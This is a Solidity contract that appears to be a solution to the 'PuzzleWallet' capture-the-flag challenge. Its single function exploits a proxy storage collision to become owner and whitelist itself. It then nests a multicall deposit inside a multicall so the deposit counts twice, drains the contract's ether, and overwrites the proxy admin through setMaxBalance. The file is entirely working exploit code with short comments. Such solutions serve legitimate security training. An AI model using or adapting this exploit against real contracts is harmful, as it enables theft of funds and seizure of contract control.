// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess();

interface ITarget {
    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function pendingAdmin() external view returns (address);

    function admin() external view returns (address);

    function owner() external view returns (address);

    function maxBalance() external view returns (uint256);

    function proposeNewAdmin(address newAdmin) external;

    function addToWhitelist(address whitelistAddress) external;

    function setMaxBalance(uint256 maxBalance) external;

    function deposit() external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function multicall(bytes[] calldata data) external payable;

    function balances(address who) external view returns (uint256);
}

contract PuzzleWallet {
    function pwn(address targetAddress) public payable {
        ITarget target = ITarget(targetAddress);
        // storage collison with
        // pendingAdmin in proxy and owner in implementation
        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));

        uint256 value = 1000000000000000;

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");

        // add deposite data again inside multicall call multicall
        // to increate balace and bypass validate
        bytes[] memory subData = new bytes[](1);
        subData[0] = data[0];
        // call multicall inside multicall to bypass depositCalled check
        data[1] = abi.encodeWithSignature("multicall(bytes[])", subData);

        target.multicall{value: value}(data);

        target.execute(msg.sender, 2 * value, "");
        // change admin proxy by set new admin address as uint256
        target.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
